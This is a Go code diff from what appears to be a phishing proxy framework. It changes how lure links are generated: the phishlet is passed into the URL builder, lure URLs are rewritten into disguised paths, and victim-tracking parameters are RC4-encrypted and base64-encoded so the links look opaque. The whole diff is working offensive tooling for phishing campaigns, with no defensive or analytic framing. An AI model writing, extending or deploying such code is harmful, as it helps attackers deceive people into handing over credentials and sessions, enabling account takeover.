@@ -776,7 +776,7 @@ func (t *Terminal) handleLures(args []string) error {
 						}
 						params_file := args[3]
 
-						phish_urls, phish_params, err = t.importParamsFromFile(base_url, params_file)
+						phish_urls, phish_params, err = t.importParamsFromFile(base_url, params_file, pl)
 						if err != nil {
 							return fmt.Errorf("get_url: %v", err)
 						}
@@ -820,10 +820,10 @@ func (t *Terminal) handleLures(args []string) error {
 
 							log.Info("adding parameter: %s='%s'", k, v)
 						}
-						phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
+						phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params, pl))
 					}
 				} else {
-					phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
+					phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params, pl))
 				}
 
 				for n, phish_url := range phish_urls {
@@ -1509,7 +1509,7 @@ func (t *Terminal) luresIdPrefixCompleter(args string) []string {
 	return ret
 }
 
-func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string, []map[string]string, error) {
+func (t *Terminal) importParamsFromFile(base_url string, path string, pl *Phishlet) ([]string, []map[string]string, error) {
 	var ret []string
 	var ret_params []map[string]string
 
@@ -1566,7 +1566,7 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 				}
 
 				if len(params) > 0 {
-					ret = append(ret, t.createPhishUrl(base_url, &params))
+					ret = append(ret, t.createPhishUrl(base_url, &params, pl))
 					ret_params = append(ret_params, map_params)
 				}
 			}
@@ -1593,7 +1593,7 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 				map_params[param_names[n]] = param
 			}
 			if len(item) > 0 {
-				ret = append(ret, t.createPhishUrl(base_url, &item))
+				ret = append(ret, t.createPhishUrl(base_url, &item, pl))
 				ret_params = append(ret_params, map_params)
 			}
 		}
@@ -1625,7 +1625,7 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 				}
 			}
 			if len(item) > 0 {
-				ret = append(ret, t.createPhishUrl(base_url, &item))
+				ret = append(ret, t.createPhishUrl(base_url, &item, pl))
 				ret_params = append(ret_params, map_params)
 			}
 		}
@@ -1762,8 +1762,86 @@ func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phis
 	return nil
 }
 
-func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
+func (t *Terminal) createPhishUrl(base_url string, params *url.Values, pl *Phishlet) string {
 	var ret string = base_url
+	
+	// Parse the base URL to extract components
+	parsedUrl, err := url.Parse(base_url)
+	if err == nil && pl != nil {
+		// Extract domain and path from the base URL
+		domain := parsedUrl.Hostname()
+		path := parsedUrl.Path
+		if path == "" {
+			path = "/"
+		}
+		
+		// Generate a temporary session ID for URL rewriting
+		tempSessionId := GenRandomAlphanumString(16)
+		
+		// Check if URL should be rewritten
+		if rewrittenPath, shouldRewrite := pl.RewriteUrlIfNeeded(domain, path, tempSessionId); shouldRewrite {
+			// Apply the rewritten path
+			parsedUrl.Path = ""
+			parsedUrl.RawQuery = ""
+			ret = parsedUrl.String()
+			
+			// Remove trailing slash if present before adding rewritten path
+			if strings.HasSuffix(ret, "/") {
+				ret = ret[:len(ret)-1]
+			}
+			
+			// Add the rewritten path (which already includes query params)
+			ret += rewrittenPath
+			
+			// If there are additional custom params, we need to append them
+			if len(*params) > 0 {
+				// Parse the rewritten URL to see if it already has query params
+				if strings.Contains(rewrittenPath, "?") {
+					// Already has query params, append with &
+					key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))
+					
+					enc_key := GenRandomAlphanumString(8)
+					dec_params := params.Encode()
+					
+					var crc byte
+					for _, c := range dec_params {
+						crc += byte(c)
+					}
+					
+					c, _ := rc4.NewCipher([]byte(enc_key))
+					enc_params := make([]byte, len(dec_params)+1)
+					c.XORKeyStream(enc_params[1:], []byte(dec_params))
+					enc_params[0] = crc
+					
+					key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))
+					ret += "&" + key_arg + "=" + key_val
+				} else {
+					// No query params in rewritten URL, add them normally
+					key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))
+					
+					enc_key := GenRandomAlphanumString(8)
+					dec_params := params.Encode()
+					
+					var crc byte
+					for _, c := range dec_params {
+						crc += byte(c)
+					}
+					
+					c, _ := rc4.NewCipher([]byte(enc_key))
+					enc_params := make([]byte, len(dec_params)+1)
+					c.XORKeyStream(enc_params[1:], []byte(dec_params))
+					enc_params[0] = crc
+					
+					key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))
+					ret += "?" + key_arg + "=" + key_val
+				}
+			}
+			
+			return ret
+		}
+	}
+	
+	// No rewrite needed, use original behavior
 	if len(*params) > 0 {
 		key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))
 
